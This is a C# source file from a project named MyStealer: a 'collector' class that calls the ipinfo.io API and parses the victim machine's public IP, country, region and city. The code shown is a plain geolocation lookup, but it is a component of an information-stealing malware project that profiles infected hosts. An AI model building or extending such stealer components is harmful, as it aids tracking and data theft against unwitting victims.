using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collectors.Ip
{
    /// <summary>
    /// https://ip.pe.kr/api/
    /// </summary>
    public class IpInfoIoProvider : ApiProviderBase
    {
        public override string ModuleName => "ipinfo.io";

        public override Uri ApiUrl => new Uri("https://ipinfo.io/json");

        public override IpDetails Parse(string response)
        {
            try
            {
                var obj = JObject.Parse(response);

                return new IpDetails
                {
                    Address = IPAddress.Parse(obj["ip"].Value<string>()),
                    CountryCode = obj["country"].Value<string>(),
                    RegionName = obj["region"].Value<string>(),
                    City = obj["city"].Value<string>()
                };
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing api response.");
                return IpDetails.Empty;
            }
        }
    }
}
